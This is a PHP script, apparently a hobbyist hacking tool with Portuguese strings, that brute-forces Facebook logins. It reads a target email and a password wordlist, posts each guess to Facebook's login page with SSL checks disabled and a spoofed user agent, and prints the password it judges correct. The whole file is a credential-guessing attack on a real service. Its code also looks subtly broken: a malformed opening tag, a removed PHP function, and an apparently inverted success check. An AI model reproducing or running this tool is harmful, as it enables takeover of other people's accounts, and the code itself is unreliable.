//?php

/*
  Tool hacker
  By Pablo Santhus
  09/08/2016
*/

	error_reporting(0);
	set_time_limit(100);
	print menu();

	$email = $argv[1];
	$dicionario = $argv[2];

function menu(){
print"--------------------------------------------------------------------\n";
print"\n";
echo"		 (                         (                                 \n";     
echo" )\ )          )  (        )\ )                 )    )            	 \n";
echo"(()/(    )  ( /(  )\      (()/(    )         ( /( ( /(    (       	 \n";
echo"/(_))( /(  )\())((_) (    /(_))( /(   (     )\()))\())  ))\  (      \n";
echo"(_))  )(_))((_)\  _   )\  (_))  )(_))  )\ ) (_))/((_)\  /((_) )\    \n";
echo"| _ \((_)_ | |(_)| | ((_) / __|((_)_  _(_/( | |_ | |(_)(_))( ((_) 	 \n";
echo"|  _// _` || '_ \| |/ _ \ \__ \/ _` || ' \))|  _|| ' \ | || |(_-< 	 \n";
echo"|_|  \__,_||_.__/|_|\___/ |___/\__,_||_||_|  \__||_||_| \_,_|/__/	 \n";
print"\n";
echo "Facebook Brute \n";
echo "Coded By Pablo Santhus \n";
echo "exemplo: php facebook.php seuemail@gmail.com wordlist.txt \n";
print "\n";
print"--------------------------------------------------------------------\n";
}

	function brute($usuario, $senha){
		$ch = curl_init('https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php');
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha&login=Login");
		curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.21 (Windows NT 5.1; U; tr)");
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$source = curl_exec($ch);
		curl_close($ch);
		if(eregi("Home", $source)){
			return false;

		}else{
			return true;

		}
	}

	if(!is_file($dicionario)){
		print "\nAdicione um dicionario!\n";
		print"--------------------------------------------------------------------\n";
		exit;
	}

	$lines = file($dicionario);
	foreach($lines as $line){
		$line = str_replace("\r", "", $line);
		$line = str_replace("\n", "", $line);
		if(brute($email, $line)){
			print"--------------------------------------------------------------------\n";
			print "\n";
			print "	[+] Email: ".$email. " Senha: ".$line. 		   "\n";
			print "\n";
			print"--------------------------------------------------------------------\n";
			$fp = fopen('cookies.txt', 'w');
			fwrite($fp, '');
			exit;
		}else{
			print "[-] Email: ".$email. " Senha Incorreta: ".$line. "\n";
		}
	}
	

?>
